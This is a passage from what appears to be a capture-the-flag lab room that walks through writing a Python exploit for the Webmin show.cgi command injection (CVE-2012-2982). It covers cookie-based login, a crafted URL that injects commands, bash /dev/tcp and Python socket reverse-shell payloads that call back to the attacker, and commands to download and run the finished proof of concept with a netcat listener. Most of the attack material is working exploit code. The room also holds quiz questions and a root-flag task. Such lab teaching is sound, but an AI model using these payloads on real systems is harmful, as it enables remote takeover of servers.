style="font-family:&quot;Arial&quot;"><span><strong>POST request sending the URI data</strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br /></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong>verify HTTP response code and the session id is not empty</strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b><br /></span></li><li><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random alphanumeric characters</span></strong></span></strong></span></span></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">Similar to the metasploit module, we can dissect our exploit into three main parts; <b>initialize payload, login, exploit</b>. <br /></span></p><p><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:24px">Initialize Payload</span></b></u><br /></span></p><p><span style="font-family:&quot;Arial&quot;">The most important task here is to enable python to execute the system shell <i>/bin/sh </i>or<i> /bin/bash</i>. Python has numerous ways to execute system programs natively but remember, we have the ability of <b>arbitrary command execution</b>, meaning that we can use whatever <b>command</b> (not just python code) necessary to establish a reverse shell including with Python, Bash, Ruby, netcat, PHP, socat and a plethora of other commands available to us. <br /></span></p><p><span style="font-family:&quot;Arial&quot;">We can examine different examples and methods applicable to our script. </span><span style="font-family:&quot;Arial&quot;">You can view reverse shell examples in python and other languages/commands in the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">PayloadsAllTheThings</a> repository as well as <a href="https://gtfobins.github.io/#+reverse%20shell" target="_blank">gtfobins</a> and <a href="https://github.com/D4Vinci/One-Lin3r" target="_blank">One-Lin3r</a>. I encourage you to experiment with the final script and test different reverse shells to see what does and doesn\'t work. <br /></span></p><span style="font-family:&quot;Arial&quot;"></span><p></p><p><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;">As discussed in more detail below, the simplest way to open a connection to the attacker and send the shell will be to run a </span><code>bash</code><span style="font-family:&quot;Arial&quot;"> command executing a reverse shell. </span><br /><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">Our initialization will be </span><code>payload = f"bash -c \'exec bash -i &amp;&gt;/dev/tcp/{lhost}/{lport}&lt;&amp;1\'"</code><span><span></span></span><span></span></p><ul><li><strike><span style="font-family:&quot;Arial&quot;"><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or system shell</span></b></span></strike></li></ul><p><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:24px">Login</span></b></u><br /></span></p><p><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span>In some cases, especially when researching, it is necessary to check if the target is vulnerable to the exploit by sending a test command like the author of the metasploit module included. For the purposes of this room because we already confirmed the CVE, we can condense the steps to login once, return if </span><span><span>302 status code</span></span><span> and return the </span><span><span>sid</span></span><span> cookie to use in the payload POST request. The request should be fairly simple and we can</span> go down our list item by item, using the </span><code><a href="https://requests.readthedocs.io/en/master/user/quickstart/" target="_blank">requests</a></code><span style="font-family:&quot;Arial&quot;"> library<br /></span></p><ul><li><span style="font-family:&quot;Arial&quot;"><span><strong>the login page URI data (credentials, receiving port and login page file)<br /></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>POST request sending the URI data</strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br /></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong>verify HTTP response code and the session id is not empty</strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b></span></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">POST requests in python can send data to a server via </span><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none">a dictionary, list of tuples, bytes or a file object. We only need three items to send as data, the page, username, and password. From the developer tools we know the exact labels of each of these; page, user, and pass.</span></p><p><code>data = {\'page\' : "%2F", \'user\' : "user1", \'pass\' : "1user"}</code><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span></span></span></p><span style="font-family:&quot;Arial&quot;">We can include a variable with the file to target using <a href="https://www.geeksforgeeks.org/formatted-string-literals-f-strings-python/" target="_blank">f-strings</a>.</span> <span style="font-family:&quot;Arial&quot;"><span style="white-space:pre">We know the receiving port is the default port 80 so we don\'t need to include it manually.</span></span><p></p><p></p><p style="line-height:1"><code>url = f"http://{targetIP}/session_login.cgi"</code><span style="font-family:&quot;Arial&quot;"></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span style="font-size:16px">Now\n we have all of the information we need to login via POST request. We\'ll\n be sending the credentials, the test cookie with its value, as well as \nignoring TLS and site redirects.</span></span></span></span></p><p style="line-height:1.5"><code>r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)<br /></code><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span><span></span></span></span></span><br /><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span style="font-size:16px"></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">Next we can include the if statement. We can check the status code and verify the cookies aren\'t empty using methods from the</span><span style="font-family:&quot;Arial&quot;"> </span><code>requests</code><span style="font-family:&quot;Arial&quot;"> module.</span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><code>if r.status_code == 302 and r.cookies["sid"] != None</code></span><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"></span></span><br /><span style="font-family:&quot;Arial&quot;"></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">In the metasploit module, the manual formatting of cookies with </span><code>.split()</code><span style="font-family:&quot;Arial&quot;">\n is necessary but this is not the case in python. While we are able to \ninclude several methods to obtain the alphanumeric cookie, we can simply\n read the value from the header directly with </span><code>r.cookies["sid"]</code><span style="font-family:&quot;Arial&quot;">. </span><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">We can assemble a quick test and see each method of formatting the cookie works.</span></span><br /><span style="font-family:&quot;Arial&quot;"></span></p><p><img style="width:795px;height:462.459px" src="https://i.imgur.com/gSfY8QZ.png" /><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><br /></span></span></p><p><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span>We\'ve now completed the login section of our exploit. <br /></span></p><ul><li><strike><span style="font-family:&quot;Arial&quot;"><span><strong>the login page URI data (credentials, receiving port and login page file)<br /></strong></span></span></strike></li><li><strike><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>POST request sending the URI data</strong></span></span></strike></li><li><strike><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br /></span></span></strike></li><li><strike><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong>verify HTTP response code and the session id is not empty</strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b></span></strike></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:24px">Exploit</span></b></u><br /></span></p><p><span style="font-family:&quot;Arial&quot;">Now we\'ve reached the main event, crafting our exploit. Let\'s review our needs and discuss some initial ideas to implement them.</span></p><ul><li><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random alphanumeric characters</span></strong></span></strong></span></span></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span>The exploit section of our code will also be straightforward. We will write functions to generate five random alphanumeric characters stored in a string and a payload which opens the shell via </span><span><code class="code-81e98f88">bash</code></span><span> and captures the output to send via a GET or POST request</span>.</span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">The simplest way to execute the payload would be to replicate the original ruby program by formatting it inside of the URL. This saves space and makes the program clearer by directly piping the invalid character to the payload. In order to do this, we\'ll have to analyze the type of data we\'re dealing with. For data to be used in conjunction, it must be of the same type. Our random character and payload functions must both be strings to be formatted in the URL. </span><br /></p><p style="line-height:1.5"><code>exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"</code><span></span><span><span></span></span><span style="font-family:&quot;Arial&quot;"><span><span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">Using the </span><code>string</code><span style="font-family:&quot;Arial&quot;"> and </span><code>secrets</code><span style="font-family:&quot;Arial&quot;"> modules we\'re able to make a function that randomly prints five alphanumeric character. The strings library does not have a native alphanumeric method, so I had to combine methods representing single digits and all cases alphabet letters.</span></p><p style="line-height:1.5"><code>alphaNum = string.ascii_letters + string.digits </code><span style="font-family:&quot;Arial&quot;"><span><span></span></span><span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span><span>We can then input this variable to be randomly generated with five characters </span></span></span><code>randChar = \'\'.join(secrets.choice(alphaNum) for i in range(5))</code><span style="font-family:&quot;Arial&quot;"><span><span><span><span></span></span><span></span></span></span></span></p><p style="line-height:1.5"><img style="width:620.2px;height:393.645px" src="https://i.imgur.com/E5iLfsI.png" /><span style="font-family:&quot;Arial&quot;"><br /></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;">And we have our invalid input function.</span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:18px">payload()</span></b></u><br /></span></p><span><span><span style="font-family:&quot;Arial&quot;">There are numerous ways to execute the system shell on Linux </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">as we have the freedom to <b>execute any command</b> that we want</span></span></span>. In this scenario we will save steps and space by using </span></span></span><code>bash</code><span><span><span style="font-family:&quot;Arial&quot;"> to open a connection to the attacker and send the shell. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell" target="_blank">PayloadsAllTheThings</a> lists the following examples:</span></span></span><p><img style="width:787px;height:160.106px" src="https://i.imgur.com/kbhckaf.png" /><span><span><span style="font-family:&quot;Arial&quot;"><br /></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">The first command listed </span></span></span><code>bash -i</code><span><span><span style="font-family:&quot;Arial&quot;"> is a popular one line command to establish an interactive reverse shell on a system. This will be the basis for our payload() function but it does require some tweaks. While it executes a reverse shell, we are missing a key point. Without specifying what to do with the bash shell that executes on boot, the system is unable to distinguish between separate processes of bash. To fix this, we can use </span></span></span><code>bash -c \'exec bash -i xyz\'</code><span><span><span style="font-family:&quot;Arial&quot;"><br /></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><b><a href="https://www.computerhope.com/unix/bash/exec.htm" target="_blank">exec</a></b> </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span>completely replaces the \ncurrent running process. The current shell process is destroyed and entirely \nreplaced by the command we specify which will be the reverse shell </span></span></span></span></span><code>bash -i &amp;&gt;/dev/tcp/TARGET_IP/PORT</code><span><span><span style="font-family:&quot;Arial&quot;"><span><span><br /></span></span></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">I also want to discuss the meaning of </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><b>"&lt;&amp;1"</b>,</span></span></span> "0&gt;&amp;1", or "</span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">0&lt;&amp;1</span></span></span>" which are interchangeable, <b><a href="https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean" target="_blank">this article</a></b> discusses the specific command in detail. I recommend reading <a href="https://stackoverflow.com/questions/24793069/what-does-do-in-bash" target="_blank">this article</a> and <a href="https://unix.stackexchange.com/questions/120532/what-does-exec-31-do" target="_blank">this article</a> if the syntax is brand new to you. The purpose of "&lt;&amp;1" is to redirect the output stream </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">(1, stdout) </span></span></span>of the TCP socket to the input stream (0, stdin) of the bash shell and create a <i>reverse</i> shell.</span></span></span><span><span><span style="font-family:&quot;Arial&quot;"> Bash opens a TCP socket on the target machine through the given port and makes a request to the given IP (the attacker). The output stream of the socket is then redirected to the input steam of the new bash shell, sending the shell process through the socket. </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">The ampersand character "&amp;" acts as a reference to the I/O socket streams. </span></span></span></span></span></span></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span><code>payload = f"bash -c \'exec bash -i &amp;&gt;/dev/tcp/{lhost}/{lport}&lt;&amp;1\'"</code><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></p><p></p><p></p><p><span><span><span style="font-family:&quot;Arial&quot;">Lastly, all we need is the second request with the authenticated cookie. The module did not specify whether to use a POST or GET method however, in this scenario either method works. <br /></span></span></span></p><p><code>req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)</code><span><span><span style="font-family:&quot;Arial&quot;"><br /></span></span></span></p><ul><li style="line-height:1.5"><strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random alphanumeric characters</span></strong></span></strong></span></span></strike></li><li style="line-height:1.5"><strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre"></span></strong></span></strong></span></span><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><br /></strong></span></strong></span></span></strike></li><li style="line-height:1.5"><strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong></strong></span></strong></span></span><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></strike><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span></span></li></ul><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"></span><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2020-09-05T04:23:42.021Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which HTTP response header allows us to send an authenticated POST request?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Which is the correct method for formatting cookies in this example?</p><p>r.headers().replace().split().strip()</p><p>r.headers().split().strip()</p><p>a = r.cookies()</p>b = a.strip()', 'hint': 'any'}, {'questionNo': 3, 'question': 'What data type does the payload need to be?', 'hint': ''}, {'questionNo': 4, 'question': 'Why do we need to use "bash -c exec" instead of just "bash -i"', 'hint': 'replaces current shell process'}, {'questionNo': 5, 'question': '<p>What is the purpose of "&lt;&amp;1" in the payload function?</p>', 'hint': 'redirects socket output stream to bash input stream'}]}, {'taskTitle': 'Final exploit and test', 'taskDesc': '<p><span style="font-family:&quot;Arial&quot;">We\'re ready to test the final script, run the following commands:</span></p><p><code>wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py</code><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">Change the attacker IP and listen for the shell with </span><code>nc -nlvp 53<br /></code></p><p><span style="font-family:&quot;Arial&quot;"></span><code>python3 web.py &lt;targetIP&gt;</code><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"> if you receive errors about missing libraries, install them with </span><code>pip</code></p><p></p><p></p><p></p><p><img style="width:1034.68px;height:523.133px" src="https://i.imgur.com/v7LQnbd.png" /><br /></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2020-09-05T04:53:27.159Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Run the program and listen for the shell. What is the /root/root.txt flag?<br />', 'hint': ''}]}, {'taskTitle': 'Common Mistakes', 'taskDesc': '<p></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">When writing exploits, the \ngoal is not to use complex code or use more than is necessary for \nthe task. While you do want clean and concise code, sometimes PoC \nscripts are crafted in specific ways, maybe the author had your original\n thought process and found an easier solution. Maybe something required in the original language is not necessary in the language you\'re using and vice versa. </span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">The point here is, do not\n feel discouraged if you try things that do not work, some would argue \nyou cannot learn without failure.<span style="font-family:&quot;Arial&quot;"> Keeping note of what did not\n work, what is unsuccessful is critical in becoming a better exploit \ndeveloper. Each mistake is a learning opportunity and gives you more \nexperience.</span></span> If\n you are ever unsure if a segment of code will work it\'s beneficial to individually test parts of it. <b>Trial and error</b>\n is one of the most important concepts to master so I believe it is \nvital to highlight what went wrong. </span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">The payload function was not as straightforward initially. The \nassumption was to determine a way to pipe the output of one function to \nanother function, the random character to the payload function. I \nfalsely assumed that you couldn\'t simply embed functions inside of a \nstring to be included in the URL. I had guessed to upload the payload \nvia the <i>data</i> parameter of the POST request, as it permits file objects. Consequentially I completely ignored the fact that we had <b>arbitrary</b> <b>command execution</b> and did not have to strictly use python. </span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><br /></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">If we wanted to execute the system shell strictly with python, we can use the </span><code>subprocess</code><span style="font-family:&quot;Arial&quot;">\n module. There are several ways to open the system shell using this \nmodule, I\'ve listed examples below. It\'s also important to understand that \nnot all systems will have python3 as the default python application, the version of python executed on the system must be \nconsidered. </span></span></span></span></p><p style="line-height:1.5"><img style="width:536.704px;height:365.9px" src="https://i.imgur.com/VwiJLEp.png" /><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><br /></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">The main difference </span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">between the three methods is</span></span></span></span></span><span style="font-family:&quot;Arial&quot;"> </span><code>subprocess.popen()</code><span style="font-family:&quot;Arial&quot;"> does not wait for the program to finish and simply continues executing. This is not useful to us as we need the complete output to send over the socket.</span><span style="font-family:&quot;Arial&quot;"><br /></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span></span>Let\'s first determine the data type \nwhen calling the shell. </span><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"> </span><span style="font-family:&quot;Arial&quot;"></span></p><p style="line-height:1.5"><img style="width:597.621px;height:271.85px" src="https://i.imgur.com/hzm4YV4.png" /><span style="font-family:&quot;Arial&quot;"><br /></span></p><p style="line-height:1.5"><br /><span style="font-family:&quot;Arial&quot;"><code>subprocess.run()</code><span style="font-family:&quot;Arial&quot;"><span><span>\n uses a CompletedProcess object with a stdout attribute. This means the \nsubprocess will return bytes as the output that we\'ll need to decode \ninto a string in order to call/format the payload inside of the URL \nstring. <b>The type of data must be equal</b>. <br /></span></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span><span>This was the original function with the subsequent error message.</span></span></span></p><p style="line-height:1.5"><img style="width:991px;height:248.029px" src="https://i.imgur.com/D0GRpBv.png" /><span style="font-family:&quot;Arial&quot;"><span><span><br /></span></span></span></p><p style="line-height:1.5"><span style="font-family:&quot;Arial&quot;"><span><span><span><span><span style="font-family:&quot;Arial&quot;">There are several mistakes here. </span></span></span></span></span></span></p><ul><li><span><span><span style="font-family:&quot;Arial&quot;">I was unaware that </span></span></span><code>subprocess.run()</code><span><span><span style="font-family:&quot;Arial&quot;"> wasn\'t used until python3</span></span></span></li><li><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">I didn\'t properly encode/decode the payload function, I received a response of </span></span></span></span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><i>b\' \'</i> meaning the POST request was empty<br /></span></span></span></span></span></span></span></span></span></li><li><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">The socket is opening on the attackers computer instead of the victim computer</span></span></span></span></span></span></span></span></span></span></span></span></li></ul><p><span><span><span style="font-family:&quot;Arial&quot;">The output was decoded as a string without first </span></span></span><span><span><span style="font-family:&quot;Arial&quot;">encoding it in <a href="https://medium.com/swlh/powering-the-internet-with-base64-d823ec5df747#:~:text=Data%20transmission%3A%20Base64%20can%20simply,avoid%20depending%20on%20external%20files." target="_blank">base64</a> or </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span>HTML encoding.</span></span></span><span><span><span style="font-family:&quot;Arial&quot;"> The order matters because of the direction data flows. We could use the \nbase64 or <a href="https://docs.python.org/3/library/urllib.parse.html" target="_blank">urllib.parse</a>\n libraries to encode the payload with ASCII characters for the \nsystems to properly exchange data over the socket. </span></span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">We can use the payload below to invoke </span></span></span><code>subprocess.call</code><span><span><span style="font-family:&quot;Arial&quot;"> in a single python <b>command</b> by </span></span></span><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">opening a socket on the target machine and calling the system shell.</span></span></span></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span></span></span><code>payload\n = "python -c \\\'import \nsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\""+\n lhost + "\\"," + lport + "));os.dup2(s.fileno(),0); \nos.dup2(s.fileno(),1); \nos.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"])\\\'"</code><span style="font-family:&quot;Arial&quot;"></span><br /></p><p><span><span><span style="font-family:&quot;Arial&quot;">From the metasploit module\'s use of </span></span></span><code>payload.encoded</code><span><span><span style="font-family:&quot;Arial&quot;"> as the attack vector is through a URL, we might assume that the data has to be URL encoded.</span></span></span></p><p><code>urlEncode = urllib.parse.quote(payload)</code></p><span><span><span style="font-family:&quot;Arial&quot;">We can also \nmanually encode/decode the payload with <a href="https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/" target="_blank">base64</a> in the event that the use of many \ncharacters would break in transit to the URI. In this scenario even though the payload does not break, <b>every system is different</b>. This emphasizes the need to understand how data is sent in case the \npayload doesn\'t execute without specifying the types of encoding necessary \nfor the systems to communicate.</span></span></span><p></p><p><img style="width:792.7px;height:148.775px" src="https://i.imgur.com/94arNLw.png" /><span><span><span style="font-family:&quot;Arial&quot;"><br /></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;">All three of these \nsolutions are feasible and have been tested to work in this example. I \nencourage you to test them yourself as well.</span></span></span></span></span></span><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span></span></span></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2020-10-30T17:27:59.516Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'No questions here<br />', 'hint': ''}]}, {'taskTitle': 'Thoughts and resources', 'taskDesc': '<p><span style="font-family:&quot;Arial&quot;">Well...that was a lot to process. Let\'s review everything we learned in this room, we learned...</span></p><ul><li><span style="font-family:&quot;Arial&quot;">what exploit development is and why we <i>should</i> learn it<br /></span></li><li><span style="font-family:&quot;Arial&quot;">how to begin writing PoC scripts </span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">with appropriate\nparameters</span></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">how to begin identifing vulnerabilities in code and point out the exploitable endpoints</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">common exploit development methodologies</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">reading metasploit source code</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">using a wide range of resources to craft scripts<br /></span></span></li></ul><p><span style="font-family:&quot;Arial&quot;">I want to emphasize that this is only one example upon the millions of vulnerabilities that exist and covering every unique one in a short amount of time is impossible, what matters is generating a method and approach. I also want to emphasize that Metasploit is not the only resource out there for developing PoC scripts and exploits in general, they are one of the largest so its an excellent resource for learning by example. I encourage you to find other resources for </span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">vulnerable </span>open source software and create your own test environment with virtual machines and containers to use privately. Exploit development is a wide ranging skill from the scope covered in this 